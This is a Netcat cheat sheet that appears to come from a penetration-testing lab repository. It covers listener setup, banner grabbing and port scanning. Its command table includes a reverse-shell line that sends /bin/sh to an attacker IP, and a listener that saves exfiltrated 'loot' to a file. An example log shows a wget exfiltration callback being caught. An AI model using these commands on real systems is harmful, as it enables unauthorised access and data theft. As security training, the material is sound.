# Netcat Cheat Sheet

## Overview

Netcat (`nc`) is a general-purpose networking utility used throughout an engagement for banner grabbing, setting up listeners for reverse shells, and — as in this repository's privilege-escalation phase — capturing data exfiltrated from a target (see [docs/07-Privilege-Escalation](../docs/07-Privilege-Escalation/README.md)).

## Common Syntax

```bash
nc [options] <target> <port>      # client mode
nc -l [options] <port>            # listener mode
```

## Useful Commands

| Command | Purpose |
|---|---|
| `nc -lvnp 4444` | Start a verbose listener on port 4444, no DNS resolution *(used in this repo)* |
| `nc -nv <target> <port>` | Connect to a target port for banner grabbing |
| `nc -lvnp 4444 > loot.bin` | Listen and redirect received data straight to a file |
| `nc -e /bin/sh <attacker_ip> <port>` | (Where supported) send a shell out to a listener — classic reverse-shell primitive |
| `nc -zv <target> 1-1000` | Fast TCP port scan across a range |

## Important Options

| Option | Description |
|---|---|
| `-l` | Listen mode |
| `-v` | Verbose |
| `-n` | Skip DNS resolution (faster, avoids leaking lookups) |
| `-p <port>` | Local port to bind (listener mode) |
| `-e <program>` | Execute a program and pipe its I/O to the connection (not present on all `nc` builds, e.g. OpenBSD variant) |
| `-z` | Zero-I/O mode, useful for port scanning |
| `-w <secs>` | Connection timeout |

## Examples

Attacker-side listener used in this repository to capture a `wget --post-file` callback from a `sudo`-elevated process on the target:
```bash
ip a               # confirm listening interface IP (tun0)
nc -lvnp 4444
```

Observed inbound connection:
```text
listening on [any] 4444 ...
connect to [192.168.128.158] from (UNKNOWN) [10.129.188.235] 39274
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
...
```

## Common Mistakes

- Forgetting to confirm which network interface/IP the target can actually reach (e.g., a VPN `tun0` interface vs. a local NIC) before starting a listener.
- Not checking firewall rules blocking the chosen listener port.
- Using `nc` for anything beyond quick, ad-hoc tasks in a real engagement without considering more robust alternatives (`socat`, Metasploit multi/handler) for reliability.

## References

- [Netcat man page (GNU/BSD variants differ — check your OS's manual)](https://man.openbsd.org/nc)

## Key Takeaways

- `nc -lvnp <port>` is the fastest way to stand up a listener to catch a callback, whether from a reverse shell or a file-exfiltration technique.
- Always verify your own IP/interface (`ip a`) before relying on it in an exploit or exfil command.
- Netcat's simplicity is its strength for quick verification, but consider more robust tooling for anything beyond a single capture.
